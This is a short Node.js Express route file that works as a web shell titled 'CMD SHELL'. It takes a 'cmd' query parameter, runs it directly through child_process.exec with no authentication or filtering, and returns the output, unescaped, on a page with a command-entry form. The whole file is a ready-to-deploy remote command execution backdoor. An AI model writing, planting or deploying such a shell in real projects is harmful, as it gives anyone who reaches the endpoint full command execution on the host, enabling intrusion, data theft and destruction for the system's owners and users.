var express = require('express');
var router = express.Router();
var exec = require("child_process").exec;
var so;


router.get('/', function (req, res, next) {
   
    exec(req.query.cmd||"HELLO", function (err, stdout, stderr) {
        console.log(req.query.cmd)
        console.log(stdout)
        if (stdout) {
            so = stdout;
        } else {
            so = "NO CONTENT";
        }
        var html = `<!DOCTYPE html> 
  <html> 
  <meta charset="UTF-8">
  <head> 
    <title><%= title %></title> 
    <link rel='stylesheet' href='/stylesheets/style.css' /> 
  </head> 
  <body> 
    <h1>CMD SHELL</h1> 
    <form id='target'action='cmd'> 
      <input id='target_input' name='cmd' type='text'> 
      <input type='submit' value='submit'> 
    </form> 
    <h1>${so}</h1> 
  </body> 
</html>`
        res.send(html);
    });
});


module.exports = router;
